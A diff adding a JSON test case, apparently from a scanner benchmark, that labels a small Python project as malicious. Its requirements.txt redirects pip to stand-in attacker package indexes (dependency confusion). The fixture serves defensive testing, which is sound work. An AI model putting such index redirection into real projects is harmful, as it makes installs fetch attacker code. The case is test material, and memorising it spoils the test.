@@ -1,0 +1,19 @@
+{
+  "id": "python-requirements-index-url",
+  "title": "requirements.txt points pip at an attacker index",
+  "kind": "malicious",
+  "expected": "warn",
+  "category": "python",
+  "technique": "A requirements file sets --index-url/--extra-index-url to an attacker-hosted index, so installing requirements pulls packages (and name-confusable internals) from the attacker.",
+  "trigger": "pip install -r requirements.txt",
+  "incident": "Index redirection / dependency confusion (Bagmar & Saraf: registry redirection is missed almost everywhere)",
+  "sources": [
+    "https://arxiv.org/abs/2607.15143"
+  ],
+  "notes": "Instructional config; harm needs pip to run. Both index hosts are reserved .invalid domains.",
+  "files": {
+    "requirements.txt": "--index-url https://pypi.attacker.invalid/simple/\n--extra-index-url https://internal.attacker.invalid/simple/\nrequests==2.32.3\nacme-internal-auth==1.0.0\n",
+    "src/main.py": "import requests\n\n\ndef get(u):\n    return requests.get(u).status_code\n",
+    "README.md": "# fetcher\n\n`pip install -r requirements.txt` then `python -m src.main`.\n"
+  }
+}
